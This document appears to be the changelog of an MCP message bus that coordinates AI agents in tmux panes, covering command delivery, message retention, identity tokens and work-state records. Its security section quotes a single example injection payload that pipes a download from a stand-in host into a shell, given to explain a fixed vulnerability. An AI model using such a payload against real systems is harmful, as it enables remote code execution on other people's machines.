# Changelog

All notable changes to this project will be documented here.

## [0.17.0] — Unreleased

### Fixed (P1 — control commands land in the pane but are not submitted)
- **`/clear` and `/compact` now actually run, or say they didn't.** Both pushers pasted the command and sent Enters on fixed 100ms/50ms delays (the remote one: a single Enter, no delay), observed nothing, and stamped the delivery receipt on the PASTE — so `send_command` returned `delivery:"confirmed"` for a command that never executed. Reproduced against a real agent TUI in two ways no delay can fix: with the pane BUSY the command queues behind the running turn (it ran ~20s later, and a turn can run for minutes), and with unsent text in the input the raw paste is APPENDED to that draft and submitted to the model as an ordinary chat message — the command never runs at all.
- **The pipeline now observes the result.** Timings are tunable and raised (`AGENT_COORD_ENTER_DELAY_MS` 400, `AGENT_COORD_ENTER_GAP_MS` 150); a control command waits for a busy pane to go idle (`AGENT_COORD_CONTROL_IDLE_WAIT_MS`, 15s), refuses to paste onto a draft, and confirms via `capture-pane` that the command left the input, retrying Enter before giving up. An unverified submission reports `delivery:"pending"` **with the reason**, never `"confirmed"` — including for a pre-upgrade pusher whose receipt cannot say (re-attach to fix). Control commands are still pasted RAW; bracketing them would make the TUI treat them as literal text.
- **One implementation, both pushers.** `hooks/submit.mjs` is shared by `hooks/tmux-pusher.mjs` and `scripts/coord-pusher.mjs`, which had already drifted apart; a test fails if either grows its own `send-keys` pipeline again.

### Fixed (Phase 8 Task 7 — retention reads the typed record)
- **A typed decision no longer ages out at chatter rate.** Three sites granted the long decision retention on the LEGACY `kind` field only — `prune`'s keep-predicate, live room compaction, and the verbatim quoting of decisions in overflow digests — so a v2 agent doing exactly what Phase 8 asks (`record:{type:"decision"}`, no legacy `kind`) had its decisions compacted early and dropped from digests. Reproduced against real compaction: two identical decision records, one `kind`-tagged and one typed, room pushed 1102 → 504, only the tagged one survived. All three now read the shared `isDecision()` predicate — defined ONCE, because three copies is how they drifted apart. The rule is monotone (`kind === "decision" || record?.type === "decision"`): it can only GRANT retention, so there is no migration and no existing file changes behaviour.
- **`npm test` asserts an expected test count.** The suite was twice seen reporting four fewer tests with zero failures and no reproduction — a count that varies silently cannot be a gate signal, since "green" and "a file failed to load" look identical. `scripts/check-test-count.mjs` fails the run on any mismatch (`AGENT_COORD_EXPECTED_TESTS` overrides; `=0` disables); `npm run test:raw` is the unchecked runner.

### Added (Phase 8 Task 5 — work state as data)
- **Queue / done / board as typed records, markdown as an export.** `docs/QUEUE.md` and `docs/DONE.md` were parsed under a contract requiring exact `—` (U+2014) and ` · ` (U+00B7); a parser once returned **zero items** on the real file while passing every synthetic test, and the consuming UI rendered an empty panel with no error. `import_work` now reads those documents (and the legacy single `docs/BACKLOG.md` layout, and `docs/WORKSTREAMS.md`'s lanes table) into records — `{id, priority, text, done}`, `{id, text, ref, date}` with **ref and date as separate fields**, and board rows — `list_work` queries them, and `export_work` renders the documents back **byte-identically**, glyph contract included.
- **The markdown remains authoritative.** The store is a derived index: `list_work` reads the documents directly when nothing has been imported, and `export_work` refuses on an empty store rather than blanking a file. Both properties are tested, not asserted. The round-trip test runs against **this repo's real documents**, not fixtures — a fixture agrees with its parser by construction, which is exactly how the original bug shipped.
- **No new write enforcement.** `export_work` can write the documents on request and reports any declared Task 4 scope alongside the write, but never refuses on that basis; ordinary file edits by agents remain unmediated, as Task 4 promised.

### Added (Phase 8 Task 4 — role identity & write scopes)
- **Roles have a frozen identity.** Registry entries gain an optional, immutable `roleId` beside the free-text `role` (now the display name); `register`/`join` accept `role: {roleId, displayName}` as well as a plain string. `isGateRunnerRole` resolves from the id instead of regex-matching prose, so renaming a role (curator → liaison → aide — twice already, 500+ occurrences each time) no longer moves who runs the merge gate. Fully additive: an existing `agents.json` loads unmodified and keeps the legacy word match, and a declared `roleId` cannot later be changed (rejected; the display name stays free).
- **Record authority at the send path.** `verdict` is restricted to gate-runner roles and `go`/`scope` to coordinators; every other `record.type` is unrestricted. `send_message` rejects violations in the identity-binding error shape before anything is written. This is a *consistency* check, not authentication — roles are self-declared at register/join — and must never be relied on as a trust boundary.
- **`register`/`join` echo record authority.** The response carries `recordAuthority: {mayEmit, mayNotEmit, note?}`, so an agent whose role owns `go`/`scope`/`verdict` learns at onboarding that it must declare that role — instead of discovering it when its first typed work order is refused. Roles that own a restricted record type must be declared (`role: {roleId: "coordinator"}`); free-text prefixes stay unrestricted.
- **`list_scopes` + `~/agent-coord/scopes.json`.** Opt-in declaration of which role owns which managed document (`docs/QUEUE.md` → `aide`, …), and a tool to ask "may I write this?" before editing one. **Advisory:** the bus has no interception point for ordinary file writes, so nothing is prevented here — pre-emptive enforcement arrives with Task 5, when work state moves into the store.
- **`doctor` check `document-scope-drift`.** Warns when a declared document's last git writer isn't its declared owner. Never `fixable` (rewriting someone's file is not a safe automatic repair), and skips cleanly with no `scopes.json`, outside a git checkout, or when the author maps to no registered agent.

### Changed
- **DMs are always push-now; routine max-age default cut 5min → 15s.** The tiers exist to absorb broadcast noise, but they were also queueing point-to-point DMs — the liaison relaying a David question sat in the digest queue for the full max-age (David had to nudge the coordinator manually). `classifyTier` now returns urgent for any DM regardless of prefix; only channel traffic queues, so the `AGENT_COORD_MAX_QUEUE_MS` default drops to 15000 (15s) — routine room chatter still coalesces into digests, it just never lags far behind. Side effect: `DONE:` DM'd to a non-gate agent now delivers immediately (the gate-runner rule still governs room `DONE:`).

## [0.16.0] — Unreleased

### Added
- **Max-age flush for the routine queue.** Routine traffic no longer waits indefinitely for an urgent trigger: once the OLDEST queued message has sat longer than `AGENT_COORD_MAX_QUEUE_MS` (default 300000 = 5min; `0` disables), the pusher flushes the whole backlog as one routine-only digest. Closes the silent-fleet failure mode where `FYI:`/`DONE:`-to-non-gate/chatter queued forever on a quiet bus and delivery looked broken (observed live 2026-07-06: the coordinator's own `FYI:`-prefixed delivery test queued itself). Age is tracked from the oldest entry (`TierQueue.flushOverdue(now)`, clock-free and unit-tested); an urgent drain resets the clock. Zero-loss semantics unchanged — the flush rides the existing confirmed-paste commit path.
- _(P3 hardening cycle: pusher reaper for wedged pushers, encrypted DMs, message reactions/acks — see docs/BACKLOG.md.)_

## [0.15.0] — 2026-07-06

### Security (Phase 9 node-daemon hardening)
- **Fail-closed tmux injection policy in the pushers.** Pastes now use bracketed paste, and injection is refused outright when the target pane's foreground command is a bare shell (crashed/exited agent CLI) — previously a peer message with embedded newlines like `"ok\ncurl evil|sh\n"` could execute as shell commands on the receiving machine. Skipped batches redeliver via the at-least-once cursor once the agent CLI is back. (closes #5)
- **HTTP sessions pinned to their bearer's agent.** An `mcp-session-id` is bound to the agent identity of the bearer token that created it, closing session takeover across tokens. (closes #3)
- **Fail-closed network gate for non-loopback binds.** Binding beyond loopback now requires explicit opt-in plus token auth, instead of silently exposing the bus. (#8)

### Added
- **Noise lifecycle: archive-not-delete, scoped prune, membership TTL, message kinds, live compaction.** Aged room/status/inbox traffic is pruned into `archive/` instead of deleted, prune is scoped per channel/agent, inactive room memberships expire on a TTL, and messages carry kinds for lifecycle policy.
- **`coord-node` — one-command remote node onboarding**, and **`coord-token` — mint/list/revoke per-agent bus tokens** (Phase 9, Task 6 MVP).

### Changed
- **`src/tools.ts` split into `src/tools/` domain modules** (pure refactor; public tool surface unchanged).

## [0.14.0] — 2026-07-03

### Changed
- **Compact injection format (salvaged from v0.8.10, re-applied over the tiered formatter).** The pushers now paste a leaner block: banner `[agent-coord] msgs (pre-consumed, don't re-read):` (routine digest: `[agent-coord] +N routine (pre-consumed, FYI, no reply):`), and each message line is `  [<kind> <HH:MM> <from>] <text>` — the `room ` prefix is stripped from the kind (`room #general` → `#general`), the timestamp is shortened from ISO-8601 to `HH:MM` UTC, and the `from=` label is dropped to a bare id. Applied to both the urgent and routine-digest sections and to **both** delivery paths (`hooks/tier.mjs` `injectLine` and the standalone `scripts/coord-pusher.mjs`), which are locked byte-identical by a source-parity test. The per-message line is the agent parse contract (harnesses read `from`/`room`/`text` back out of it); it stays unambiguously machine-parseable — kind/time/from never contain spaces, so a parser splits on the first `] `. Cuts per-message injection overhead materially on busy panes without losing any field.

## [0.13.0] — 2026-07-03

### Added
- **`/doctor [--fix]` in coord-chat, plus a `coord-chat --doctor [--fix]` CLI flag.** Surfaces the existing `doctor` MCP health check in the TUI and as a non-interactive command. Both delegate to the compiled `doctorTool` (dynamically imported from `dist/`), so the report is the single source of truth — no reimplemented, drift-prone checks — and CLI/in-chat output match exactly. The renderer shows per-check status icons (✓/!/✗), item lists, applied fixes under `--fix`, and an ok/warn/error summary; the CLI exits 0 when healthy and 1 on any error-level finding (suited to a supervisor cron). coord-chat now pins `AGENT_COORD_DIR` to its resolved `ROOT` so a `--dir` override still targets the same state dir the imported tool reads. Closes the last open item in the doctor roadmap section.

## [0.12.0] — 2026-07-03

### Added
- **Delivery tiers + digest batching in the pusher.** Only push-now traffic wakes an agent's pane: `BLOCKER:`, `DAVID_DECISION:`, literal `GO:` work orders, `SCOPE:`/`SCOPE CHANGE:` from trusted senders (coordinator/gate ids resolved from the registry), `DONE:` when the agent is a gate runner (QA/coordinator — from the registry role, re-resolved every 30s, `AGENT_COORD_GATE_RUNNER=1|0` overrides), control commands, and server-flagged urgent messages (the post-`/clear` identity reminder carries a non-spoofable `urgent: true` set server-side). Prefixes are literal and case-sensitive. All other traffic (`FYI:`/`AGENT_ACTION:`/`RISK:`/chatter) queues silently in memory and rides the next push as ONE coalesced `[agent-coord] digest` block — an idle agent with only low-tier backlog is never woken, so routine ops cost zero model tokens. **Zero-loss by construction:** the on-disk cursor (shared with `read_messages`) advances only after `tmux paste` is confirmed; a crash, `SIGTERM`, or pane-death self-exit before that rewinds to the cursor and redelivers on restart (at-least-once — duplicates are possible after a mid-flush crash, loss is not). Routine messages receive their delivery receipt when their digest lands, not before. The tier classifier and queue are pure and dependency-free (`hooks/tier.mjs`) with direct unit tests. `AGENT_COORD_TIERS=0` restores legacy push-everything.

## [0.11.0] — 2026-07-03

### Added
- **`ping {from, to, echo?}` — token-free liveness probe.** Answers alive/dead + latency entirely from server-side state: registry entry, heartbeat freshness, transport marker + pusher pid, and a tmux pane-existence probe for local tmux-push transports. It never touches the target's session, so pinging the whole fleet costs zero model tokens on the targets. Returns `alive` (fresh heartbeat or live transport), `reachable` (a DM pushed now would land), granular `checks`, and `latencyMs`. Distinct from `heartbeat`, which is an agent refreshing its own activity timestamp. `echo:true` (default **off**) additionally drops a `PING:` DM into the target's inbox for an agent-level acknowledgement — that wakes the target's model, so it is strictly opt-in. `from` is enforced against the session's bound identity.

## [0.10.1] — 2026-07-03

### Changed
- **Status reads get the room recency window.** `read_messages(source="status")` now defaults to the most recent 50 entries (was: full drain) and reuses the CCR overflow path — older entries are replaced by a `history` digest with a retrieval hash, expandable via `retrieve_room_history`. The fleet-wide status stream grows unbounded, so a fresh agent no longer floods its context by draining hundreds of stale status posts on join. Fully backward-compatible: the per-agent cursor still advances past everything accounted for, `sinceTs` still filters, an explicit `limit` overrides the window, and `peek` stays side-effect-free (digest without hash). Inbox behavior is unchanged (full drain — targeted messages must never be skipped).

## [0.10.0] — 2026-06-22

### Added
- **Reversible channel-history compression (CCR pattern).** When a `read_messages` room read finds more backlog than the window (default 50), it now returns the **most recent messages raw** plus a compact `history` digest of the older overflow — instead of draining oldest-first in 50-message chunks. The digest summarizes the overflow (message count, distinct agents, time span, and any error/failure posts) and carries a retrieval `hash`. The agent expands the originals on demand via the new **`retrieve_room_history({agentId, hash, query?})`** tool; `query` returns only matching messages (case-insensitive substring). This kills the "agent joins a busy channel and floods its own context with history" problem without losing any data.
  - **Scoped + TTL'd.** History entries are content+scope addressed and bound to the `(room, agent)` they were produced for — a hash can't be replayed by another agent to read a channel it never read. Entries expire after 30 minutes (the data is a disposable cache of `rooms/<chan>.jsonl`, so losing one only costs a re-read at a higher `limit`). `prune` sweeps expired entries.
  - **Peek-safe.** `peek:true` reports the overflow count but never stashes a hash (peek is side-effect-free); read without peek to get an expandable hash.

## [0.9.0] — 2026-06-22

### Added
- **Out-of-band delivery receipts for `send_command`.** The receiving pusher now stamps a receipt in `~/agent-coord/receipts/<id>.jsonl` *after* it types a control command into the pane. `send_command` blocks until that receipt appears and returns `delivery:"confirmed"` + `deliveredAt` — proof the keystrokes reached the CLI, not just that the message was written to JSONL. If no receipt arrives within `deliveryTimeoutMs` (default 8000ms) it returns `delivery:"pending"` + a warning pointing at a stale/wedged pusher. The room form reports `confirmed:[…]` / `pending:[…]` (`delivery:"partial"` when some lag). This closes the silent-drop class of bug (the original "`/clear` isn't firing" report): a wedged pusher used to ack by silence with no way to tell.
  - **Zero added agent context.** The receipt lives in a file the *sender* polls — it never enters any inbox or room, so no agent pays tokens for it. The confirmation rides back in the caller's existing tool result.
  - `waitForDelivery:false` restores the old fire-and-forget behavior; `deliveryTimeoutMs` tunes the wait. Receipts are trimmed by `prune` (and orphan receipt logs removed) like other logs.

## [0.8.5] — 2026-06-09

### Added
- **`quit` tool** — an agent can now cleanly shut down its own MCP session: detaches transport, leaves all rooms, removes itself from the registry, then exits the server process. Gated to the bound identity; cannot be used to kill another agent's session.
- **Improved unbound identity warning** — startup message now explicitly states that TOFU locks the identity permanently for the session lifetime, and points to `quit` as the clean path to restart under a new name.

## [0.8.4] — 2026-06-08

### Added
- **`delete_room` tool** — permanently deletes a channel (registry entry + JSONL history + cursor offsets). Refuses if members are still joined unless `force: true` is passed. Cannot delete `general`. Posts a system notice to `#general` on deletion.
- **`force_unregister` tool** — admin eviction of any agent by `targetAgentId`, bypassing the identity gate. Same cleanup logic as `unregister` but callable by any session. Useful after a reboot to clear stale registrations.

## [0.8.3] — 2026-06-07

### Added
- **Post-`/clear` identity reminder** — when `send_command` delivers a `/clear`, it auto-schedules a reminder DM ~3s later that names the recipient's `agentId` and points them at `status()` / `list_rooms()` to re-orient. Without this, a freshly-cleared worker loses its understanding of who it is and that it's on the bus.
- `reminderMs` option to change the delay or opt out (`reminderMs: 0`). `reminderText` overrides the body.
- Per-recipient reminders on room-scoped `/clear` broadcasts — each tmux-attached member gets their own DM.
- `/compact` explicitly does not schedule a reminder (it preserves a summary the agent can still read).

## [0.8.2] — 2026-06-05

### Added
- **Stale-pusher detection in `doctor`** — `attach_agent` now records the pusher script's mtime at spawn time as `scriptMtime` on the transport marker. `doctor()` compares this against the current on-disk script and warns when the running pusher predates a server upgrade. Includes the concrete remediation (`detach_agent` + `attach_agent`).
- Pre-v0.8.2 markers (no `scriptMtime`) and remote markers are skipped to avoid false positives.

## [0.8.1] — 2026-06-04

### Changed
- Dependency audit: patched fast-uri, hono, ip-address, qs. Zero vulnerabilities.

## [0.8.0] — 2026-06-03

### Added
- **`send_command` tool** — injects `/clear` or `/compact` keystrokes into a target agent's tmux pane via the push transport. Useful for a coordinator to trigger context resets on workers without the worker needing to self-manage.
- Pusher self-exit: the tmux-pusher daemon now exits cleanly when it detects the session it's attached to has closed.

## [0.7.2] — 2026-05-30

### Added
- **`doctor` tool** — bus-wide health diagnostic. Checks orphan transport markers, orphan room memberships, orphan inboxes/cursors, cursors past EOF, malformed JSONL, stale agents, oversized files, stale lockfiles, channel/registry consistency, and environment sanity. Read-only by default; `fix: true` applies reversible repairs (backed up to `.bak`). A clean `doctor()` run is now wired into the test suite as an end-to-end consistency assertion.
- Remote transport markers use heartbeat-based liveness (not pid), correctly handled in `doctor`.

## [0.7.1] — 2026-05-27

### Added
- **Trust-on-first-use (TOFU) session binding** — without any config, the first tool call that carries an `agentId`/`from` locks that identity for the session. Subsequent calls from the same session claiming a different identity are rejected. Stops the PR #45 chair-spoof pattern with zero operator setup.
- 5 new end-to-end tests against a spawned stdio server covering TOFU scenarios.

### Changed
- "Advisory mode" renamed to "TOFU" in startup messages — it's a real protection, not advisory.

## [0.7.0] — 2026-05-25

### Added
- **Per-agent token binding** — `~/agent-coord/tokens.json` maps `agentId` → bearer token. The server reverse-looks-up incoming bearers and rejects any tool call where the claimed identity doesn't match.
- **`AGENT_COORD_BOUND_AGENT` env** for stdio — each subprocess is pre-bound to a single agent id at launch.
- `rename_agent` atomically rotates the token entry so the renamed session keeps authenticating.
- `SIGHUP` reloads `tokens.json` without a server restart.

### Changed
- All 17 tools that take `from`/`agentId` now pass through the identity gate. Mismatch returns a clear rejection message.

## [0.6.0] — 2026-05-20

### Added
- **Streamable HTTP transport** — run the server as a long-lived HTTP daemon by setting `AGENT_COORD_HTTP_PORT`. Remote agents use the same MCP tools over the wire; no file-syncing required.
- **Bearer-token auth** for HTTP via `AGENT_COORD_TOKEN`.
- **`coord-pusher` binary** — runs on a remote machine, long-polls the bus, and pastes incoming messages into a local tmux pane. Same filtering and debounce as the local pusher.
- **`report_transport` / `clear_transport` tools** — remote counterparts to `attach_agent` / `detach_agent` for the remote pusher to publish its transport marker.
- Bind defaults to `127.0.0.1`; `AGENT_COORD_BIND` required to expose on LAN.

## [0.5.0] — 2026-05-10

### Added
- **Multi-channel support** — `join_room`, `leave_room`, `list_rooms`, `set_room_topic`, `set_room_motd`. Membership tracked per agent; push-attached agents only receive channels they've joined.
- **`rename_agent`** — migrates registry, inbox, cursor, transport, and channel memberships atomically.
- Backward-compatible: legacy `room.jsonl` content is served as `#general`.

## [0.4.0] — 2026-05-03

### Added
- **`coord-chat` TUI** — IRC-style readline interface for humans. Register, post to rooms, DM agents, see who's online. Per-agent colors, tab completion for slash commands and `@mentions`, inline markdown formatting, admin commands (`/prune`, `/kick`, `/wipe-room`, `/find`, `/status`).
- Last 3 messages shown on join for context.

## [0.3.0] — 2026-04-28

### Added
- **Real-time tmux push transport** — `attach_agent` / `detach_agent` and `hooks/tmux-pusher.mjs`. Incoming DMs are typed into the agent's tmux pane within ~1s. `join()` auto-attaches when `$TMUX_PANE` is set.
- Transport markers in `~/agent-coord/transports/` surface in `list_agents` so peers can tell at runtime who is reactive vs turn-bound.

## [0.1.0] — 2026-04-15

### Added
- Initial release: file-backed MCP server over stdio.
- `register`, `unregister`, `send_message` (DM + room), `read_messages`, `wait_for_message`, `post_status`, `list_agents`, `prune`.
- All state in `~/agent-coord/` as JSONL/JSON. `tail -f ~/agent-coord/room.jsonl` works from any terminal.
